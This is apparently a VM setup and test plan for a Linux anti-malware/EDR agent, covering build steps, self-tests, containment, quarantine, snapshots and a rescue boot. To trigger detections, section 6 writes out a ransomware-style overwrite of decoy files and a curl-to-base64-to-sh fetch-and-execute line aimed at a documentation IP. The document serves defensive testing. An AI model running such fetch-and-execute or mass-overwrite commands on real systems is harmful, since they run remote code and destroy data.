# HyprNova Anti-Malware Sec — VM bring-up and test plan

(Product name: **HyprNova Anti-Malware Sec**; core/binaries keep the stable
`hyprnova` / `hyprnovad` / `hyprnova-cli` identifiers, so configs and unit
files survive rebrands.)

This project is Linux-only (inotify/fanotify/netlink-audit/cgroup v2), so a VM is
exactly the right place to run it. But a VM is not a bare-metal host, and four of
the seven modules behave differently inside one. This document says which, and what
to do about it.

---

## 1. Get the source into the VM

From Windows (PowerShell), with the workspace on the Windows side:

```powershell
# Recommended: QEMU/KVM (what the owner tests on). Create the guest:
#   qemu-img create -f qcow2 /var/lib/libvirt/images/hyprnova-test.qcow2 40G
#   virt-install --name hyprnova-test --memory 4096 --vcpus 4 --cpu host \
#     --disk path=/var/lib/libvirt/images/hyprnova-test.qcow2,format=qcow2,virtio \
#     --cdrom debian-13-amd64-netinst.iso --os-variant debian13 --network network=default \
#     --boot uefi        # OVMF: required for the Secure Boot audit to have something to audit
# Or with plain qemu-system: add -enable-kvm -cpu host -smp 4 -m 4G -drive file=...,if=virtio
#
# If the VM is VirtualBox/VMware with a shared folder, just copy:
scp -r .\hyprnova\ user@<vm-ip>:~/hyprnova
```

Or from inside the VM if you have git access to the workspace.

**Do not build on a mounted Windows filesystem** (`/mnt/c/...` under WSL2, or a
VirtualBox shared folder). Those mounts do not support Unix permissions or
symlinks properly, `chmod 0600` silently no-ops, and the quarantine/self-test
checks that assert file modes will fail for reasons that have nothing to do with
the code. Copy to the VM's own ext4 first.

---

## 2. Build

```bash
cd ~/hyprnova
sudo apt install -y build-essential cmake        # Debian/Ubuntu
# or: sudo dnf install -y gcc-c++ cmake make     # Fedora

cmake -S . -B build -G "Unix Makefiles" -DCMAKE_BUILD_TYPE=RelWithDebInfo
cmake --build build -j$(nproc)
```

Expected configure output — **every one of these being FALSE is normal and fine**:

```
hyprnova: libyara NOT found -> using the in-tree YaraLite engine
hyprnova: libnftables NOT found -> shelling out to the nft binary
hyprnova: libaudit NOT found -> using the in-tree NETLINK_AUDIT client
hyprnova: Qt6 NOT found -> hyprnova-gui will not be built
```

Every external dependency has an in-tree fallback. That is deliberate: an EDR that
refuses to build without libyara is an EDR that does not get deployed.

Two VM-specific notes:

- **2 cores / 2 GB is enough.** Use `-j2`, not `-j$(nproc)` with a huge number —
  the JSON translation unit is heavy and will OOM a 2 GB VM at `-j8`.
- **Qt6 for the GUI**: `sudo apt install qt6-base-dev qt6-declarative-dev
  qml6-module-qtquick-controls qml6-module-qtquick-layouts`. Then re-run cmake;
  it prints `Qt6 6.x found -> building hyprnova-gui`. The GUI needs a desktop
  session in the VM (install `xfce4` or run under X forwarding).

---

## 3. What a VM cannot show you

| Module | VM behaviour | Why |
|---|---|---|
| **1 — Secure Boot** | Will report `platform_supports_uefi=false` or score ~40 | Boot the guest with UEFI (QEMU/KVM: OVMF, `--boot uefi`) and the audit becomes real. On SeaBIOS this is a **correct finding, not a bug** — the boot chain is not verifiable. |
| **1 — Kernel lockdown** | `unavailable` unless the VM uses Secure Boot | lockdown only engages with SB or `lockdown=` on the cmdline |
| **4 — Falco** | Degraded unless you install Falco | Falco needs its own kernel module/eBPF probe; run `falco` in the VM and point `falco.socket_path` at its socket |
| **4 — auditd** | Works, but `enabled=0` on many cloud/VM images | Run `sudo auditctl -e 1` and install `auditd`; the sensor will pick up the netlink stream |
| **6 — cgroup containment** | Works only if the VM runs cgroup v2 unified | Check `stat -fc %T /sys/fs/cgroup` → should say `cgroup2fs`. If the VM's init is not systemd, this degrades to SIGSTOP, which is still tested |
| **2/6 — fanotify FAN_OPEN_PERM** | Needs `CAP_DAC_READ_SEARCH`, i.e. root | Run the daemon as root; inotify still works unprivileged |

Everything else — canaries, entropy, mass-modify detection, YaraLite signatures,
the heuristic engine, escalation, nftables blocks, quarantine, the GUI — works
identically in a VM.

---

## 4. Smoke test as your normal user (no root)

```bash
./build/hyprnovad --self-test
```

You should see ~31 `ok:` lines and two `SKIP:` lines about privileged paths, then
`SELF-TEST PASSED`. That exercises SHA-256 against the FIPS vector, HMAC against
RFC 4231, Shannon entropy at both extremes, both lock-free rings under contention,
the event bus, `/proc` enrichment, the subprocess layer including its timeout,
JSON parsing, atomic writes, and the built-in signature rules — including a
negative control asserting that `ls -la /var/log && systemctl status nginx` does
**not** trip the C2 rule.

The self-test is also the fastest way to see the two real bugs it caught during
development (both now fixed): the MPSC ring accepting exactly one item, and the
Aho-Corasick scan treating node 0 as "uninitialised".

---

## 5. Full run as root

Write a config first. `--dump-config` emits every key with its default, so you
never have to guess a name:

```bash
sudo mkdir -p /etc/hyprnova/rules /var/lib/hyprnova /var/log/hyprnova /run/hyprnova
./build/hyprnovad --dump-config | sudo tee /etc/hyprnova/agent.json > /dev/null
sudo ./build/hyprnovad --describe        # human-readable summary of what will run
```

Then run in the foreground so you can watch it:

```bash
sudo ./build/hyprnovad -f -v -c /etc/hyprnova/agent.json
```

In a second terminal:

```bash
sudo ./build/hyprnova-cli status
sudo ./build/hyprnova-cli sensors
sudo ./build/hyprnova-cli risk
sudo ./build/hyprnova-cli network
```

**Run the first full pass with `-n` (`--dry-run`).** Findings are recorded and
published, but nothing is signalled, blocked or quarantined. Only remove it once
you have watched what it *would* do to your VM — an EDR that SIGSTOPs your sshd
because of a mis-set `protected_processes` list is an outage you cause yourself.

---

## 6. Trigger each module deliberately

This is the part that makes the demo real. All of it is safe inside a VM.

**Module 2 — canaries and ransomware behaviour**

```bash
sudo ./build/hyprnova-cli canaries          # shows the planted decoys
# Simulate enumeration-then-encryption. Use a throwaway dir, not your home.
mkdir -p /tmp/ransomsim && cd /tmp/ransomsim
for i in $(seq 1 40); do head -c 64k /dev/urandom > "doc$i.docx"; done
# Now encrypt-in-place faster than the 500ms/10-file threshold:
python3 -c "
import glob,os
for f in glob.glob('/tmp/ransomsim/*.docx'):
    d=os.urandom(os.path.getsize(f))
    open(f,'wb').write(d)
"
sudo ./build/hyprnova-cli events 20
```

Expect a `FileCanaryHit` or mass-modify `EntropyVerdict` at High/Critical with the
per-file Shannon entropy in the event, and the writing pid attributed.

**Module 5 → 6 — escalation and containment**

```bash
# A suspicious lineage: a web-server-like parent spawning a shell.
sleep 3600 & PARENT=$!
setsid /bin/sh -c 'curl -s http://203.0.113.9/x | base64 -d | sh' & SUSPECT=$!
sudo ./build/hyprnova-cli investigate $SUSPECT
```

`investigate` runs the whole pipeline synchronously and prints the lineage, the
risk score, how many memory regions were scanned, how many were writable+executable
(W^X violations), which signature rules matched strings pulled out of anonymous
executable memory, and which lineage binaries were batch-scanned. It freezes the
process **first**, because every later step reads `/proc/<pid>/mem` and freezing
preserves the image.

If it decides the evidence does not hold up, it resumes the process and says so.

**Module 6 — network containment**

```bash
sudo ./build/hyprnova-cli block 203.0.113.9 443 600
sudo ./build/hyprnova-cli network          # shows the block with its TTL
sudo nft list table inet hyprnova_edr      # the actual ruleset, with counters
sudo ./build/hyprnova-cli unblock <id>
```

Rules are applied from a 0600 temp file with `nft -f`, never via argv — argv would
leak the whole ruleset into `/proc/<pid>/cmdline` where any local user can read it.
Blocks are TTL-bounded and flushed on shutdown, so a crash cannot leave stale
filters behind.

**Module 6 — quarantine and restore**

```bash
echo 'test' > /tmp/suspect.bin
sudo ./build/hyprnova-cli quarantine /tmp/suspect.bin
sudo ./build/hyprnova-cli remediation      # shows the id + sha256
sudo ./build/hyprnova-cli restore <id> /tmp/restored.bin
```

Quarantine keeps the sample 0400 plus a `.meta` JSON with the original mode/uid/gid
so `restore` puts it back exactly as it was.

**Module 1 — hardening drift and remediation**

```bash
sudo ./build/hyprnova-cli hardening        # boot trust score, sysctls, MAC profile
sudo sysctl kernel.yama.ptrace_scope=0     # deliberately weaken one knob
sudo ./build/hyprnova-cli harden kernel.yama.ptrace_scope 2
sudo ./build/hyprnovad --self-test         # (or `harden-all` via the CLI)
```

`harden` writes `/proc/sys/...` directly rather than exec'ing `sysctl -w`, rejects
any key containing shell metacharacters, and verifies the read-back.

---

## 6b. Recovery — shadow copies

A snapshot of the agent's state (canary key, baselines, journals, config, rules,
planted canaries) is taken **at every agent start**, into
`<state_dir>/shadow/<UTC-stamp>-<pid>/`, and retention keeps the newest
`shadow.keep` (default 5). When a host is "very bad", this is the restore path:

```bash
./build/hyprnova-cli -s /run/hyprnova/gui.sock snapshots            # list, newest first
./build/hyprnova-cli -s /run/hyprnova/gui.sock verify-snapshot ID   # re-hash every file
./build/hyprnova-cli -s /run/hyprnova/gui.sock restore-snapshot ID            # back to original paths
./build/hyprnova-cli -s /run/hyprnova/gui.sock restore-snapshot ID /tmp/rescued   # into a scratch dir
```

Every restore is hash-verified against the snapshot's manifest BEFORE anything is
written; a corrupted or tampered snapshot is refused, not partially applied. The
snapshot directory is plain files plus a readable `manifest.json`, so a host too
broken to run the agent can still be recovered with `cp` and the manifest.

Snapshots can also be taken on demand (`snapshot "reason"`) — e.g. before applying
a hardening change. Tune `shadow.roots` / `shadow.keep` in agent.json.

## 6c. Trusted third-party profiles

Two features let other people's trusted work be respected instead of re-done:

* **AppArmor profiles for other apps.** Drop profiles into `mac.profile_dirs`
  (default `/etc/hyprnova/apparmor.d`; the distribution's `/etc/apparmor.d` is
  always honoured too). The agent counts them, reports them, and — the finding
  that matters — flags any daemon that has a trusted profile available but is
  running UNCONFINED anyway. The agent never loads or edits profiles; loading
  stays the admin's `apparmor_parser -r` call.
* **Per-app heuristic profiles.** JSON files in `heuristic.profiles_dir`
  (default `/etc/hyprnova/profiles`):
  `{"app": "nginx", "allowed_children": ["php-fpm"], "forbidden_children": ["curl"]}`.
  Allowed pairs are exempt from the global forbidden-children policy; forbidden
  entries add app-specific rules on top. One malformed file is skipped; the rest
  load.

## 6d. The sign of life

```bash
watch -n 30 ./build/hyprnova-cli -s /run/hyprnova/gui.sock status
# or the live console:
./build/hyprnova-cli -s /run/hyprnova/gui.sock watch [--every MS]
```

`watch` prints every heartbeat (`♥ alive  uptime=… posture=… published=…`, one
every `agent.heartbeat_interval`), every escalation and remediation action the
moment it happens, an idle status line when nothing is happening, and it
reconnects automatically if the agent restarts. If `watch` goes quiet, the agent
is down — which is itself the alert.

## 7. Shut it down and check it cleaned up

```
Ctrl-C        # or: sudo systemctl stop hyprnovad
sudo nft list table inet hyprnova_edr      # should be gone or empty
ps -eo pid,stat,comm | awk '$2 ~ /T/'      # nothing left frozen by the agent
```

Shutdown order is deliberate and matters: sensors stop → GUI is told → **every
suspended process is resumed and every nftables block flushed** → the bus drains →
the pool joins. Reversing it would leave frozen processes and a filtered network
that nothing remembers configuring.

---

## 8. Running it as a service

```bash
sudo cmake --install build          # installs hyprnovad, hyprnova-cli, unit, tmpfiles
sudo systemctl daemon-reload
sudo systemctl enable --now hyprnovad
systemctl status hyprnovad
journalctl -u hyprnovad -f
```

`SIGHUP` reloads configuration without a restart (`sudo systemctl kill -s HUP
hyprnovad`, or `hyprnova-cli reload`). Reload pauses the sensors for the config
swap rather than mutating a `const&` that running sensor threads are reading —
that costs a few seconds of coverage and buys a race-free reload.

## 6e. The Toolbox — ecosystem integrations

The product does not pretend to be the whole Linux security ecosystem; it
inventories it, uses what is installed, and tells the truth about what is not.

```bash
./build/hyprnova-cli -s /run/hyprnova/gui.sock toolbox
# coverage matrix: 78 registered tools in 12 categories, plus the live
# /proc seccomp audit of every process on the host

sudo ./build/hyprnova-cli -s /run/hyprnova/gui.sock tool-run rkhunter   # or lynis, chkrootkit, clamav, aide, trivy, ...
./build/hyprnova-cli -s /run/hyprnova/gui.sock vt-lookup <sha256>       # needs an API key (below)
```

* On-demand runners go through the hardened exec layer (absolute path, minimal
  environment, hard timeout, kill-on-timeout, capped output) — never popen,
  never a relative PATH lookup.
* rkhunter / chkrootkit / ClamAV / Lynis output is parsed into findings
  (fixture-tested at every startup by the self-test).
* Online services are key-gated and privacy-gated: VirusTotal receives the
  SHA-256 hash only, file upload to ANY.RUN / Joe Sandbox / Hybrid Analysis is
  off unless `integrations.online_submission: true`.

```jsonc
// agent.json
"integrations": {
  "enabled": true, "runner_enabled": true, "tool_timeout_seconds": 300,
  "virustotal_enabled": false, "virustotal_api_key": "",
  "online_submission": false
}
```

## 6f. The console (Qt6/QML) — vibrancy build note

```bash
sudo apt install -y qt6-base-dev qt6-declarative-dev \
  qml6-module-qtquick-controls qml6-module-qtquick-layouts qml6-module-qtquick-window
cmake -S . -B build && cmake --build build -j$(nproc)
./build/hyprnova-gui -c /etc/hyprnova/agent.json
```

* The shell is the Kaspersky-style layout: sidebar navigation, hero verdict,
  recommendation cards (generated from REAL findings, dismissible), Quick Scan,
  global search (Ctrl+F, lands pre-filtered on Threats), Tools page = the
  coverage matrix.
* Vibrancy: `gui.vibrancy: true` (default) makes the window frameless with a
  rounded, semi-transparent base plate; every element and every piece of text
  on it is fully opaque. Without a compositor Qt renders opaque — same look,
  no artifacts. Set `gui.vibrancy: false` for plain window decorations.
* The QML is verified by `scripts/qml_load_check.py` (PySide6 offscreen load of
  the full tree; run `pip install PySide6-Essentials` first). It caught and we
  fixed: a FINAL-property shadowing of `Button.icon`, 23 C++-style adjacent
  string literal concatenations, a `super.` use, non-Item Shortcut delegates
  and an anchor-ordering bug — the kind of thing a grep can never see.

## 9. Combined scans, systemd audit and the rescue environment (tested layouts)

```bash
# one command, many engines; the in-tree engine ALWAYS runs, so these are real
# detections even with zero external tools installed:
hyprnova-cli deep-scan quick /home            # engine + ClamAV over user-writable dirs
hyprnova-cli deep-scan deep                   # + rkhunter, chkrootkit, AIDE, LMD
hyprnova-cli deep-scan kernel                 # rootkits + kernel taint + seccomp posture
hyprnova-cli deep-scan audit                  # Lynis + `systemd-analyze security` exposure
hyprnova-cli systemd-check                    # per-unit sandboxing suggestions
```

Install the external tools for the full effect:
`sudo apt install clamav rkhunter chkrootkit aide lynis` — profiles pick them up
automatically on the next run; absent tools are reported as `[skip]`, never hidden.

### Rescue environment (reboot-scan, Kaspersky-Rescue-Disk style)

For rootkits that own the running kernel, HyprNova arms a reboot scan:

```bash
sudo vi /etc/hyprnova/agent.json     # rescue.enabled: true, rescue.iso_path: /path/rescue.iso
sudo hyprnova-cli rescue-prepare     # dry run: shows the GRUB entry + cleaner, lists blockers
sudo hyprnova-cli rescue-prepare --write   # stage ISO to /boot/hyprnova + write the GRUB entry
sudo hyprnova-cli rescue-boot        # grub-reboot into the rescue entry (boot-once)
# ... in the rescue env:  sh /boot/hyprnova/clean.sh /mnt/realroot
# next normal boot: the agent ingests /var/lib/hyprnova/rescue-report.json and
# raises a tool.finding event with the count -- run `hyprnova-cli rescue-status`
```

Good ISOs: Kaspersky Rescue Disk ships clamav+nfts tooling; SystemRescue works
after installing clamav inside it. Adjust the two kernel/initrd lines in the
generated GRUB entry if your ISO's layout differs — `rescue-prepare` prints the
exact bytes it will write before `--write` is allowed.

### QEMU/KVM note for the rescue flow

Test the rescue boot in a **snapshot-protected** guest: `virsh snapshot-create-as
hyprnova-test pre-rescue` first. The entry is boot-once by default (`grub-reboot`),
so a failed rescue image still returns to the normal system on the next restart.
